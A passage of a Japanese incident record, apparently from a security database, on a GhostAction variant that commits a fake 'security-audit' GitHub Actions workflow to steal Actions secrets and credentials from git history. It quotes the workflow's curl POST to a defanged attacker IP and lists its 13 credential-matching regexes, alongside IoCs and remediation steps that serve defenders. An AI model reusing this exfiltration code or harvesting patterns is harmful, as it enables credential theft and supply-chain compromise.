`push`（ブランチ・パスのフィルタ無し）であり、 「The job runs on any push to any branch or tag, with no filter, plus workflow_dispatch for manual re-runs」 （ジョブはフィルタ無しで任意のブランチ・タグへの任意の push で実行され、 加えて手動の再実行のための workflow_dispatch を持つ）** （原文英語。本記録の訳）。 **本記録の読みでは、攻撃者はコードを書いていない**（本記録の判断）—— **ファイルを1つ置くだけで実行に到達している**</div><div class=fn>根拠: Socket ブログ（kitao/pyxel のコミット 97670a55 から取得した全文）</div></li><li><div class=stg><span class="b stage">4. 収集</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**継承された半分: 事前に埋め込まれた名前で Actions シークレットを 取り出し、`out` 変数に連結する**（Socket が示した全文の15行目）—— **kitao/pyxel では CARGO_REGISTRY_TOKEN・PERSONAL_ACCESS_TOKEN・ PYPI_PASSWORD・PYPI_USERNAME。** **Socket はこれらを公開用資格情報と位置づけ、 「the ability to ship a malicious release of a package that users already trust」（利用者が既に信頼しているパッケージの 悪性リリースを出荷する能力）が価値だとしている** （原文英語。本記録の訳）。 **追加された半分: `fetch-depth: 0` で全ブランチ・全タグを取得したうえで、 5つの変数で収集する**—— **`grepped`（作業ツリーの13パターン。.git を除外）、 `gl`（`git log -p --all | head -200000` の生のパッチ本文）、 `hist`（`gl` に対する13パターン。`head -300`）、 `ctx`（作業ツリーの AWS アクセスキー ID の前後2行。`head -150`）、 `hctx`（`gl` に対する同じ前後2行。`head -150`）。** **すべてを単一の変数 `full` に連結し、 `AKIA_CTX_START`／`AKIA_CTX_END` で前後文の区間を囲む**</div><div class=fn>根拠: Socket ブログが示したワークフロー全文（kitao/pyxel・commit 97670a55）</div></li><li><div class=stg><span class="b stage">5. 持ち出し</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**収集した内容を単一の HTTP POST で送出する**—— **`curl -s -m 20 -X POST --data-binary &quot;$full&quot; &quot;hxxp://193.32.204[.]199/?c=monami&quot; || true`** （Socket が示した全文。defang 表記は Socket のもの）。 **平文の HTTP であり、宛先はハードコードされた単一の IP アドレスである** （本記録の確認）。 **本文が空でないときのみ送信される**（`if [ -n &quot;$(echo $full | tr -d &#x27; \n&#x27;)&quot; ]`）。 **`|| true` により、送信が失敗してもジョブは成功のまま終わる** （本記録の読み）—— **実行履歴上で失敗として目立たない。** **Socket は「Both collection methods append to a single variable and leave in one HTTP request」（両方の収集方法が単一の変数に追記され、 1つの HTTP リクエストで出て行く）としている**（原文英語。本記録の訳）</div><div class=fn>根拠: Socket ブログが示したワークフロー全文および IoC 一覧</div></li><li><div class=stg><span class="b stage">6. 影響（暗号化・破壊・改ざん）</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**2026年10月9日時点で、Socket が確認したリポジトリの既定ブランチに ワークフローファイルが残っている**（uber/athenadriver と kitao/pyxel を含む）。 **注入されたワークフローは影響を受けたリポジトリで実行に成功している。** **一方、この活動の結果として PyPI または crates.io に 悪性のパッケージ版が公開されたことは、Socket は確認していない** （2026年10月9日時点）。 **追記では、2026年10月7日以降に500超のアカウントが 数万リポジトリへ同じワークフローをコミットしており、 侵害された貢献者経由で組織所有のリポジトリにも到達している**</div><div class=fn>根拠: Socket ブログ本文および冒頭の追記</div></li></ol></div>
+<section id="s5"><h2>同じ1ファイルが「Actions のシークレット」と「git 履歴に残る鍵」を掃き、対策は互いに効かない<span class="b slot">概観</span></h2><p><strong>Socket が公表した事実</strong>（2026年10月9日・同日に追記）</p>
+<table>
+<thead>
+<tr>
+<th>項目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>キャンペーン</td>
+<td><strong>GhostAction</strong>（GitGuardian が2025年9月に記録したものの変種）</td>
+</tr>
+<tr>
+<td>バーストの日時</td>
+<td><strong>2026年10月8日</strong>。kitao 13:40〜13:44 UTC（27件）／henrywoo 21:10:15〜21:26:32 UTC（318件＋uber/athenadriver）</td>
+</tr>
+<tr>
+<td>規模（本文の分析）</td>
+<td><strong>346リポジトリ</strong>（henrywoo 318＝ソース39・フォーク279／kitao 27／uber/athenadriver 1）</td>
+</tr>
+<tr>
+<td>規模（追記）</td>
+<td><strong>2026年10月7日以降、500超のアカウントが数万リポジトリへ</strong></td>
+</tr>
+<tr>
+<td>置かれるファイル</td>
+<td><strong><code>.github/workflows/security-audit.yml</code></strong>（別名 <code>github_actions_security.yml</code>）</td>
+</tr>
+<tr>
+<td>トリガ</td>
+<td><strong><code>on: push</code>（ブランチ・パスのフィルタ無し）＋ <code>workflow_dispatch</code></strong></td>
+</tr>
+<tr>
+<td>継承された半分</td>
+<td><strong>Actions シークレットの窃取</strong>（事前に偵察した名前を埋め込む。kitao/pyxel では CARGO_REGISTRY_TOKEN・PERSONAL_ACCESS_TOKEN・PYPI_PASSWORD・PYPI_USERNAME）</td>
+</tr>
+<tr>
+<td>追加された半分</td>
+<td><strong><code>fetch-depth: 0</code> で全ブランチ・全タグを取得 → 作業ツリーと <code>git log -p --all</code>（20万行まで）に13種の資格情報パターンを照合</strong></td>
+</tr>
+<tr>
+<td>AWS 向けの作り込み</td>
+<td><strong>AKIA／ASIA の前後2行を作業ツリーと履歴の両方から切り出し、40文字のシークレットごと鍵対を復元</strong></td>
+</tr>
+<tr>
+<td>送出</td>
+<td><strong><code>hxxp://193.32.204[.]199/?c=monami</code> へ平文 HTTP で1回 POST</strong>（本文の目印: <code>REPO=</code>・<code>AKIA_CTX_START</code>・<code>AKIA_CTX_END</code>）</td>
+</tr>
+<tr>
+<td>下流への波及</td>
+<td><strong>2026年10月9日時点で PyPI・crates.io への悪性版の公開は未確認</strong></td>
+</tr>
+<tr>
+<td>現況</td>
+<td><strong>確認されたリポジトリの既定ブランチにファイルが残存。実行は成功済み</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>表の読みどころは3つある</strong>（本記録の指摘）。</p>
+<ol>
+<li><strong>2つの露出は対策が互いに効かない。</strong> Socket の結論がそのまま要点である—— <strong>「Actions シークレットの入れ替えはコミットされた資格情報の露出に何の効果もなく、作業ツリーの走査は Actions シークレットの露出に何の効果もない」</strong>（原文英語。本記録の訳）。<strong>1ファイルが2種類の鍵を1回の POST で持ち出すため、対応も2系統必要になる</strong>（本記録の判断）。</li>
+<li><strong>偵察を要する半分と要しない半分が同居している。</strong> <strong>履歴掃きは偵察を要さないため、同一の静的ファイルを346リポジトリへ短時間で展開できた</strong>（本記録の読み）—— Socket は「each file byte-identical apart from the rendered secret list」（各ファイルは展開されたシークレット一覧を除いてバイト単位で同一）として自動化を指摘している（原文英語。本記録の訳）。</li>
+<li><strong>攻撃者はコードを書いていない。</strong> <strong>ファイルを1つ置くだけで、次の push で実行に到達している</strong>（本記録の判断）。</li>
+</ol></section>
+<section id="s6"><h2>新しいのは「もう消したと思っている鍵」が対象に入ったこと——fetch-depth: 0 が射程を決めた<span class="b slot">原因・手口</span></h2><p><strong>Socket は、追加された部分の起点を1行に特定している。</strong></p>
+<blockquote>
+<p><code>fetch-depth: 0</code> is what makes it possible. The default checkout fetches a single shallow branch; depth zero fetches every branch and tag, which gives <code>git log -p --all</code> the full patch text of the repository's history to read, including commits that were rewritten off the default branch but remain reachable from a stale branch or tag. Those are credentials the maintainer most likely believes are gone.</p>
+</blockquote>
+<p><strong>（訳）<code>fetch-depth: 0</code> がそれを可能にしている。既定のチェックアウトは単一の浅いブランチを取得するが、depth 0 は全ブランチ・全タグを取得する。これにより <code>git log -p --all</code> はリポジトリの履歴の完全なパッチ本文を読めるようになる——既定ブランチから書き換えで外されたが、古いブランチやタグから到達可能なコミットも含めて。それらは、メンテナがもう消えたと思っている資格情報である。</strong>（原文英語。本記録の訳）</p>
+<p><strong>本記録はここを本件の中心と読む</strong>（本記録の判断）—— <strong>既定値（浅いチェックアウト）が防御として働いていた。</strong></p>
+<p><strong>収集は5つの変数で行われる</strong>（Socket の整理に基づく本記録の表）。</p>
+<table>
+<thead>
+<tr>
+<th>変数</th>
+<th>対象</th>
+<th>何を集めるか</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>grepped</code></td>
+<td>作業ツリー（<code>.git</code> を除外）</td>
+<td>現在チェックアウトされているファイル中の13パターン</td>
+</tr>
+<tr>
+<td><code>gl</code></td>
+<td><code>git log -p --all</code>（<code>head -200000</code>）</td>
+<td><strong>全ブランチ・全タグの生のパッチ本文</strong>（次の2つが読むバッファ）</td>
+</tr>
+<tr>
+<td><code>hist</code></td>
+<td><code>gl</code></td>
+<td>同じ13パターンを<strong>履歴に対して</strong>照合（<code>head -300</code>）</td>
+</tr>
+<tr>
+<td><code>ctx</code></td>
+<td>作業ツリー</td>
+<td><strong>AWS アクセスキー ID の前後2行</strong></td>
+</tr>
+<tr>
+<td><code>hctx</code></td>
+<td><code>gl</code></td>
+<td><strong>履歴中の AWS アクセスキー ID の前後2行</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Socket は2つの前後文抽出を「追加部分のうち最も意図的な箇所」と評している。</strong>理由は技術的に明快である。</p>
+<blockquote>
+<p>An AKIA or ASIA value is only a key identifier; it authenticates nothing on its own.</p>
+</blockquote>
+<p><strong>（訳）AKIA や ASIA の値は鍵の識別子にすぎず、それ自体では何も認証しない。</strong>（原文英語。本記録の訳）</p>
+<p><strong>必要なのは40文字のシークレットアクセスキーであり、実務上それは <code>.env</code>・AWS の認証情報ファイル・Terraform の変数ファイル・CI の設定ブロックで1〜2行離れた場所にある</strong>（Socket の分析）。<strong>前後2行を取ることで、孤立した識別子ではなく使える鍵対が復元される</strong>（本記録の整理）。<strong><code>AKIA_CTX_START</code>／<code>AKIA_CTX_END</code> の区切りは、収集側がこの区間を別に解析するためのものである</strong>（Socket の説明）。</p></section>
+<section id="s7"><h2>13種の内訳が、攻撃者の値付けを示している<span class="b slot">被害規模・影響範囲</span></h2><p><strong>Socket がペイロードから抽出し、分類して列挙した13種である</strong>（本記録の整理。分類の見出しは Socket のもの）。</p>
+<table>
+<thead>
+<tr>
+<th>分類</th>
+<th>パターン</th>
+<th>Socket による価値の説明（本記録の訳）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>AWS</strong></td>
+<td><code>AKIA[0-9A-Z]{16}</code></td>
+<td>長期のアクセスキー ID</td>
+</tr>
+<tr>
+<td></td>
+<td><code>ASIA[0-9A-Z]{16}</code></td>
+<td>STS の一時アクセスキー ID</td>
+</tr>
+<tr>
+<td></td>
+<td><code>(?:aws_)?secret(?:_access)?_key</code> ＋40文字</td>
+<td><strong>シークレットアクセスキー</strong>（変数名で照合）</td>
+</tr>
+<tr>
+<td></td>
+<td><code>aws_session_token</code> ＋100文字以上</td>
+<td>STS のセッショントークン</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td><strong>直接のクラウドアカウントへのアクセス——計算資源・ストレージ・データ、およびそこからの権限昇格</strong></td>
+</tr>
+<tr>
+<td><strong>AI サービス</strong></td>
+<td><code>sk-ant-…</code></td>
+<td>Anthropic の API キー</td>
+</tr>
+<tr>
+<td></td>
+<td><code>sk-proj-…</code></td>
+<td>OpenAI のプロジェクトキー</td>
+</tr>
+<tr>
+<td></td>
+<td><code>sk-or-(v1-)?…</code></td>
+<td>OpenRouter のキー</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td><strong>課金される推論の転売、およびそのキーを通るプロンプトとデータへの到達</strong></td>
+</tr>
+<tr>
+<td><strong>ソース管理</strong></td>
+<td><code>ghp_[A-Za-z0-9]{36}</code></td>
+<td>GitHub の classic 個人アクセストークン</td>
+</tr>
+<tr>
+<td></td>
+<td><code>github_pat_…{60,}</code></td>
+<td>GitHub の fine-grained 個人アクセストークン</td>
+</tr>
+<tr>
+<td></td>
+<td><code>glpat-…</code></td>
+<td>GitLab の個人アクセストークン</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td><strong>リポジトリの読み書き、およびさらなるワークフロー注入の能力</strong></td>
+</tr>
+<tr>
+<td><strong>SaaS・クラウド API</strong></td>
+<td><code>AIza[A-Za-z0-9_-]{35}</code></td>
+<td>Google／Firebase／GCP の API キー</td>
+</tr>
+<tr>
+<td></td>
+<td><code>xox[baprs]-…</code></td>
+<td>Slack の bot／user／app／refresh トークン——<strong>社内のやり取りへのアクセス</strong></td>
+</tr>
+<tr>
+<td></td>
+<td><code>SG\.…\.…</code></td>
+<td>SendGrid の API キー——<strong>信頼された送信元ドメインからの外部送信</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>本記録がこの内訳を記録したのは、攻撃者が何に値段を付けているかの指標になるためである</strong>（本記録の判断）。</p>
+<ul>
+<li><strong>AI サービスのキーが3種含まれている。</strong> <strong>Socket が価値を「課金される推論の転売」としていることは、金銭的な動機を示唆する</strong>（本記録の読み。断定の材料ではない）。</li>
+<li><strong>ソース管理のトークンが3種含まれている。</strong> <strong>窃取されたトークンが次の侵害の資格情報になる</strong>（本記録の評価）—— <strong>本件のペイロード自身が、本件と同じ攻撃の燃料を集めている。</strong></li>
+<li><strong>SendGrid が含まれている。</strong> <strong>信頼されたドメインから送れるメールは、次のフィッシングの土台になる</strong>（本記録の読み）。</li>
+</ul>
+<p><strong>「収集されないもの」は列挙されていない</strong>（本記録の確認）—— 13種に合致しない資格情報（Azure・Stripe・Twilio 等）は本変種の照合対象に含まれないと読めるが、Socket は明示していない。</p></section>
+<section id="s8"><h2>継承された半分が狙うのは公開用資格情報——1アカウントの侵害が下流の事案になる仕組み<span class="b slot">波及・関係先</span></h2><p><strong>ペイロードの15行目が、初期の GhostAction から受け継がれた部分である</strong>（Socket の説明）。<strong>事前の偵察で読み取った、そのリポジトリが実際に使っているActions シークレットの名前が、そのまま埋め込まれている。</strong></p>
+<p><strong>kitao/pyxel の場合の4つ</strong>（Socket の観測）。</p>
+<table>
+<thead>
+<tr>
+<th>シークレット名</th>
+<th>向く先</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CARGO_REGISTRY_TOKEN</code></td>
+<td><strong>crates.io の公開権限</strong></td>
+</tr>
+<tr>
+<td><code>PYPI_PASSWORD</code> / <code>PYPI_USERNAME</code></td>
+<td><strong>PyPI の公開権限</strong></td>
+</tr>
+<tr>
+<td><code>PERSONAL_ACCESS_TOKEN</code></td>
+<td><strong>GitHub のリポジトリ操作</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Socket はこれらの価値をこう書いている。</strong></p>
+<blockquote>
+<p>These are publishing credentials. Their value to an attacker is the ability to ship a malicious release of a package that users already trust, which is the mechanism that turns a single account compromise into a downstream supply chain incident.</p>
+</blockquote>
+<p><strong>（訳）これらは公開用の資格情報である。攻撃者にとっての価値は、利用者が既に信頼しているパッケージの悪性リリースを出荷する能力であり、これが単一のアカウント侵害を下流のサプライチェーン事案に転化させる仕組みである。</strong>（原文英語。本記録の訳）</p>
+<p><strong>kitao/pyxel の規模はスター18,420・フォーク966で、Rust と Python により PyPI と crates.io で配布されている</strong>（Socket の記述）。<strong>Socket はこれを「公開用資格情報が成功した実行によって狙われた、もっとも明確な確認例」としている。</strong></p>
+<p><strong>2026年10月9日時点で、下流への波及は未確認である。</strong></p>
+<blockquote>
+<p>Socket has observed no malicious package versions published to PyPI or crates.io as a result of this activity at the time of writing.</p>
+</blockquote>
+<p><strong>（訳）Socket は本稿執筆時点で、この活動の結果として PyPI またはcrates.io に悪性のパッケージ版が公開されたことを確認していない。</strong>（原文英語。本記録の訳）</p>
+<p><strong>本記録はこの2つを厳密に分けて記録する</strong>（本記録の明記）—— <strong>「鍵が渡った」と「鍵が使われた」は別の事実である。</strong> <strong>Socket が推奨する対応に「露出期間中およびその後に出た想定外のバージョンを確認し、自前のビルド成果物と照合する」が含まれるのは、この区別があるためである</strong>（本記録の読み）。</p></section>
+<section id="s9"><h2>自社アカウントが無傷でも汚染される——uber/athenadriver が示した構造<span class="b slot">波及・関係先</span></h2><p><strong>346件のうち1件は Uber 所有のリポジトリである。</strong></p>
+<blockquote>
+<p>uber/athenadriver, an Uber-owned repository that henrywoo has write access to as its original author.</p>
+</blockquote>
+<p><strong>（訳）uber/athenadriver は、原作者として henrywoo が書き込み権限を持つUber 所有のリポジトリである。</strong>（原文英語。本記録の訳）</p>
+<p><strong>本記録はこれを、本件の構造上もっとも重い論点と読む</strong>（本記録の評価）。</p>
+<ul>
+<li><strong>Uber 自身のアカウントは侵害されていない。</strong></li>
+<li><strong>侵害されたのは、過去にそのコードを書いた個人のアカウントである。</strong></li>
+<li><strong>その個人に残っていた書き込み権限が、組織のリポジトリへの経路になった。</strong></li>
+</ul>
+<p><strong>追記では、これが例外でないことが示されている。</strong></p>
+<blockquote>
+<p>several organization-owned ones reached through the compromised contributors</p>
+</blockquote>
+<p><strong>（訳）侵害された貢献者経由で到達された、組織所有のものが複数ある。</strong>（原文英語。本記録の訳）</p>
+<p><strong>本記録の評価では、これは「委託先の侵害が委託元に及ぶ」構造と同じ形である</strong>（本記録の判断）—— <strong>自社の認証を固めても、他人のアカウントの権限が残っていれば届く。</strong></p>
+<p><strong>もう1つ見落としやすいのはフォークである</strong>（本記録の指摘）。<strong>346件のうち279件は henrywoo 名前空間のフォークである</strong>（Socket の観測）。<strong>Socket はフォークの管理者に対し、影響を受けた名前空間から取得したフォークで Actions を有効にする前に、該当ワークフローの有無を確認するよう求めている。</strong> <strong>フォークで Actions が無効なら実行されないが、後から有効にすると走る</strong>（本記録の読み）。</p>
+<p><strong>攻撃者はリポジトリの価値を見ていない</strong>（本記録の判断）。</p>
+<blockquote>
+<p>Decade-dormant repositories were included alongside active ones, which is consistent with automated enumeration rather than selective targeting.</p>
+</blockquote>
+<p><strong>（訳）十年休眠しているリポジトリが活動中のものと並んで含まれており、これは選別的な標的設定ではなく自動的な列挙と整合する。</strong>（原文英語。本記録の訳）</p></section>
+<section id="s10"><h2>送出は単一 IP への平文 POST 1回。`|| true` が実行履歴から失敗を消している<span class="b slot">対策・注意喚起</span></h2><p><strong>送出部分はワークフローの最後の数行である</strong>（Socket が示した全文）。</p>
+<pre><code>full=&quot;$out AKIA_CTX_START $ctx $hctx AKIA_CTX_END $grepped $hist&quot;
+if [ -n &quot;$(echo $full | tr -d ' \n')&quot; ]; then
+  curl -s -m 20 -X POST --data-binary &quot;$full&quot; &quot;hxxp://193.32.204[.]199/?c=monami&quot; || true
+fi
+</code></pre>
+<p>（defang 表記は Socket のもの）</p>
+<p><strong>本記録が読み取った設計上の点は4つである</strong>（本記録の判断）。</p>
+<ol>
+<li><strong>両方の半分が単一の変数 <code>full</code> に連結され、1回の POST で出る。</strong> Socket の言葉では—— <strong>「ネットワークデータを見る防御側には、無関係な2種類のシークレットを運ぶ1つの POST が見える」</strong>（原文英語。本記録の訳）。</li>
+<li><strong>本文が空でないときだけ送信する。</strong> <strong>何も取れなかったリポジトリでは通信が発生しない</strong>（本記録の読み）—— <strong>C2 側のログに無駄が出ない。</strong></li>
+<li><strong><code>|| true</code> が付いている。</strong> <strong>送信が失敗してもジョブは成功のまま終わる</strong>（本記録の読み）—— <strong>実行履歴上で失敗として目立たない。</strong> <strong>Socket が「完了した実行は情報流出とみなす」ことを推奨しているのは妥当だが、「成功」は送信の成否を保証しない</strong>（本記録の指摘）。</li>
+<li><strong>宛先はハードコードされた単一の IP への平文 HTTP である。</strong> <strong>検知は容易だが、IP は容易に変えられる</strong>（本記録の評価）。</li>
+</ol>
+<p><strong>Socket が示した IoC</strong>（本記録の整理）。</p>
+<table>
+<thead>
+<tr>
+<th>種別</th>
+<th>値</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C2</td>
+<td><strong><code>193.32.204[.]199</code></strong>（クエリに <code>c=monami</code>）</td>
+</tr>
+<tr>
+<td>ファイル名</td>
+<td><strong><code>.github/workflows/security-audit.yml</code></strong>／<strong><code>.github/workflows/github_actions_security.yml</code></strong></td>
+</tr>
+<tr>
+<td>コミットメッセージ</td>
+<td><code>Add security audit workflow</code>／<code>Update security audit workflow</code>／<code>Add Github Actions Security workflow</code></td>
+</tr>
+<tr>
+<td>本文の目印</td>
+<td><code>REPO=</code>／<code>AKIA_CTX_START</code>／<code>AKIA_CTX_END</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>本記録は、抽出された IoC の悪性を検証していない</strong>（本DBの方針）—— <strong>照合先のテレメトリを持たないため、検知には使わない。</strong> <strong>過去の通信ログを遡って検索し「渡ったか」を確定する用途に使う</strong>（本記録の判断）。</p>
+<p><strong>ただし本件の多くは、利用者側のネットワークログに残らない</strong>（本記録の指摘）—— <strong>GitHub ホストのランナーで走る場合、見えるのは Actions の実行履歴だけである。</strong> <strong>Socket が送信ログの探索に「セルフホストランナーの範囲を含む」と断っているのはこのためと読める</strong>（本記録の読み）。</p></section>
+<section id="s11"><h2>対応は2系統——どちらか片方を終えて「対応済み」としないこと<span class="b slot">再発防止</span></h2><p><strong>Socket は対応を露出の種別ごとに分けて示している</strong>（本記録の整理）。</p>
+<p><strong>①Actions シークレットが漏えいした可能性がある場合</strong></p>
+<table>
+<thead>
+<tr>
+<th>対応</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>入れ替え</td>
+<td>ワークフローが参照していた<strong>シークレットをすべて</strong>入れ替える。<strong>PAT は失効させる</strong></td>
+</tr>
+<tr>
+<td>配布基盤の確認</td>
+<td><strong>PyPI・crates.io で、露出期間中およびその後に出た想定外のバージョンを確認し、自前のビルド成果物と照合する</strong></td>
+</tr>
+<tr>
+<td>実行履歴</td>
+<td><strong>注入されたワークフローの実行履歴を確認し、完了した実行は情報流出とみなす</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>②リポジトリ内に資格情報が残っていた可能性がある場合</strong></p>
+<table>
+<thead>
+<tr>
+<th>対応</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>走査</td>
+<td><strong><code>HEAD</code> だけでなく <code>git log -p --all</code> で全履歴を確認し、到達不能なオブジェクトも含める</strong></td>
+</tr>
+<tr>
+<td>入れ替え</td>
+<td><strong>履歴に一度でも現れた資格情報は露出したものとして、対象13カテゴリすべてを入れ替える</strong></td>
+</tr>
+<tr>
+<td>クラウド側</td>
+<td><strong>AWS キーが見つかった場合は CloudTrail で、露出期間中と以後の不審な IAM ユーザー・アクセスキー・リージョンを確認する</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>③共通</strong></p>
+<ul>
+<li><strong>影響を受けたリポジトリ（組織所有のものを含む）から該当ファイルを削除し、コミットを revert する。</strong></li>
+<li><strong>アカウント侵害を前提に、セッション・PAT・OAuth 許可・SSH 鍵を失効させ、耐フィッシング性の高い多要素認証を再登録する。</strong></li>
+<li><strong>組織の監査ログで該当時間帯の push を調べ、アカウントが書き込める全リポジトリで同名ファイルの追加を探す。</strong></li>
+<li><strong>送信ログ（セルフホストランナーの範囲を含む）で C2 への通信を探し、遮断する。</strong></li>
+<li><strong>secret scanning と push protection を有効化し、外部共同作業者によるワークフロー実行には承認を求める。</strong></li>
+<li><strong>フォークの管理者は、影響を受けた名前空間から取得したフォークでActions を有効にする前に、該当ワークフローの有無を確認する。</strong></li>
+</ul>
+<p><strong>本記録が最後に置く指摘は1つである</strong>（本記録の判断）。<strong>①と②は別の作業であり、片方を終えて「対応済み」としてはならない。</strong> Socket の結論をもう一度置く——</p>
+<blockquote>
+<p>Rotating Actions secrets does nothing for a committed-credential exposure, and scanning the working tree does nothing for an Actions-secret exposure.</p>
+</blockquote>
+<p><strong>（訳）Actions シークレットの入れ替えはコミットされた資格情報の露出に何の効果もなく、作業ツリーの走査は Actions シークレットの露出に何の効果もない。</strong>（原文英語。本記録の訳）</p>
+<p><strong>2026年10月9日時点で、Socket が確認したリポジトリの既定ブランチにはファイルが残っている</strong>（uber/athenadriver と kitao/pyxel を含む）—— <strong>削除すら進んでいない段階である</strong>（本記録の読み）。</p></section>
+<div class="blk " id="s12"><h3>事案の詳細</h3><div class=twrap><table class="g dt"><tbody><tr><th>affected_asset</th><td>**GitHub のリポジトリと、その GitHub Actions の実行環境**（本記録の整理）。 **置かれるファイルは `.github/workflows/security-audit.yml`** （別名 `.github/workflows/github_actions_security.yml` も Socket が IoC として挙げている）。 **トリガは `on: workflow_dispatch` と `on: push`（ブランチ・パスの フィルタ無し）であり、任意のブランチ・タグへの push で実行される。** **本記録の読みでは、攻撃の射程を決めたのは `fetch-depth: 0` である** （本記録の評価）—— **Socket は「The default checkout fetches a single shallow branch; depth zero fetches every branch and tag」 （既定のチェックアウトは単一の浅いブランチを取得するが、 depth 0 は全ブランチ・全タグを取得する）と説明している** （原文英語。本記録の訳）—— **これにより `git log -p --all` が、既定ブランチから書き換えで外された コミットのパッチ本文まで読めるようになる**（古いブランチやタグから 到達可能なもの）。 **Socket はこれを「Those are credentials the maintainer most likely believes are gone」（メンテナがもう消えたと思っている資格情報である）と 評している**（原文英語。本記録の訳）</td></tr><tr><th>漏えいした情報項目</th><td><ul class=cl><li>GitHub Actions のシークレット（対象リポジトリで実際に使われている名前を事前に偵察して埋め込む。kitao/pyxel では CARGO_REGISTRY_TOKEN・PERSONAL_ACCESS_TOKEN・PYPI_PASSWORD・PYPI_USERNAME）</li><li>AWS の長期アクセスキー ID（AKIA 形式）</li><li>AWS の STS 一時アクセスキー ID（ASIA 形式）</li><li>AWS のシークレットアクセスキー（変数名 aws_secret_access_key 等に続く40文字で照合）</li><li>AWS の STS セッショントークン（aws_session_token に続く100文字以上）</li><li>Anthropic の API キー（sk-ant- 形式）</li><li>OpenAI のプロジェクトキー（sk-proj- 形式）</li><li>OpenRouter のキー（sk-or- / sk-or-v1- 形式）</li><li>GitHub の classic 個人アクセストークン（ghp_ 形式）</li><li>GitHub の fine-grained 個人アクセストークン（github_pat_ 形式）</li><li>GitLab の個人アクセストークン（glpat- 形式）</li><li>Google／Firebase／GCP の API キー（AIza 形式）</li><li>Slack のトークン（xox[baprs]- 形式。bot／user／app／refresh）</li><li>SendGrid の API キー（SG. 形式）</li><li>AWS アクセスキー ID の前後2行（作業ツリーと履歴の両方。鍵対の復元を狙う）</li></ul><span class="b rsn">stated</span><div class=fn>**いずれも「ペイロードが収集を試みる対象」であり、 各リポジトリで実際に何が取れたかは個別である**（本記録の明記）。 **Socket は「The injected workflow has run successfully in affected repositories」（注入されたワークフローは影響を受けたリポジトリで 実行に成功している）としており、収集が成立した実行が存在する** （原文英語。本記録の訳）。 **kitao/pyxel が「公開用資格情報が成功した実行によって狙われた もっとも明確な確認例」とされている**（本記録の確認）。 **本記録の評価では、13種の内訳そのものが攻撃者の値付けを示している** （本記録の判断）—— **AWS はクラウド資産への直接のアクセスと権限昇格、 AI サービスのキーは推論資源の転売とプロンプト・データへの到達、 ソース管理のトークンはさらなるワークフロー注入、 Slack は社内のやり取り、SendGrid は信頼されたドメインからの外部送信** （Socket の分類）</div></td></tr><tr><th>悪用の有無</th><td><b>状況:</b> 確認済み　<b>時点:</b> 2026年10月9日（Socket の公表時点）　<b>補足:</b> **資格情報の収集そのものは成立している**（本記録の判断）—— **Socket は注入されたワークフローが実行に成功していると観測し、 kitao/pyxel を公開用資格情報が狙われた明確な確認例としている。** **一方、収集された資格情報を使った後続の行為は未確認である**（本記録の整理）—— **Socket は「no malicious package versions published to PyPI or crates.io as a result of this activity at the time of writing」 （本稿執筆時点で、この活動の結果として PyPI または crates.io に 悪性のパッケージ版が公開されたことは確認していない）としている** （原文英語。本記録の訳）。 **本記録はこの2つを区別して記録する**（本記録の明記）—— **「鍵が渡った」と「鍵が使われた」は別の事実である。** **AWS 等のクラウド側での不正利用の有無についても、 Socket は観測を示していない**（本記録の確認）</td></tr><tr><th>ログの有無</th><td>**本件は防御側のログで追える類型である**（本記録の評価）—— **Socket は①組織の監査ログで該当時間帯の push を調べること、 ②アカウントが書き込める全リポジトリで同名ファイルの追加を探すこと、 ③注入されたワークフローの実行履歴を確認し完了した実行は情報流出とみなすこと、 ④送信ログ（セルフホストランナーの範囲を含む）で C2 への通信を探すことを 推奨している**（本記録の確認）。 **本記録の読みでは、④が最も確実な証跡である**（本記録の判断）—— **C2 は単一の固定 IP（193.32.204[.]199）への平文 HTTP POST であり、 クエリに `c=monami`、本文に `REPO=`・`AKIA_CTX_START`・`AKIA_CTX_END` を含む** （Socket が示した IoC）。 **一方、GitHub ホストのランナーからの送信は利用者側のネットワークログに 残らない**（本記録の指摘）—— **その場合に頼れるのは Actions の実行履歴である**</td></tr><tr><th>復旧状況</th><td>**2026年10月9日時点で未解消である**（本記録の判断）—— **Socket は「the workflow file remains present on the default branch of the repositories Socket checked, including uber/athenadriver and kitao/pyxel」（Socket が確認したリポジトリ——uber/athenadriver と kitao/pyxel を含む——の既定ブランチにワークフローファイルが 残っている）としている**（原文英語。本記録の訳）。 **追記ではさらに規模が拡大しており、収束の見通しは示されていない** （本記録の確認）—— **本記録が status を updating とした理由である**</td></tr></tbody></table></div></div>
+<div class="blk " id="s13"><h3>経過</h3><div class=twrap><table class=g><tbody><tr><td class="sm nowrap tw">2025年9月</td><td class=nowrap><span class="b kind">調査報告書の公表</span></td><td>**GitGuardian が GhostAction キャンペーンを記録した**（Socket の記述）。 **この時点で狙われていたのは GitHub Actions のシークレットのみである**—— **Socket は「Earlier waves took only what was stored in GitHub Actions secrets」（初期の波は GitHub Actions シークレットに保存されたものだけを 取った）としている**（原文英語。本記録の訳）</td></tr><tr><td class="sm nowrap tw">2026年（月は示されていない）</td><td class=nowrap><span class="b kind">調査報告書の公表</span></td><td>**GitGuardian が GhostAction の再来を報告した**（Socket の記述）。 **報告の時期・内容の詳細は Socket の記述からは判別できない**（本記録の確認）</td></tr><tr><td class="sm nowrap tw">2026年10月7日（Socket の追記が示した起点）</td><td class=nowrap><span class="b kind">発生</span></td><td>**Socket 